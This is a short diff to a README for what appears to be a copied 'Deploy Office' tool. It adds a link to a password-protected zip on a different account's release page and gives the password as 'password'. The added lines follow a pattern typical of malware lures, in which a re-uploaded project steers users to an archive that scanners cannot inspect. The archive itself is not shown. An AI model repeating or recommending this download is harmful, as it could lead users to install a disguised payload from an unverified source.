@@ -1,5 +1,7 @@
 IMPORTED THIS PROJECT FROM THIS [REPO](https://github.com/asheroto/Deploy-Office)
-I imported it for my personal use  
+I imported it for my personal use 
+
+Download the [latest Release](https://github.com/darsaliq00/OFFICE/releases/latest/download/Deploy-Office.zip) in the releases section. Password for the zip file is `password`.
 # Deploy Office
 
 ![Screenshot](https://github.com/asheroto/Deploy-Office/blob/master/screenshot.webp?raw=true)
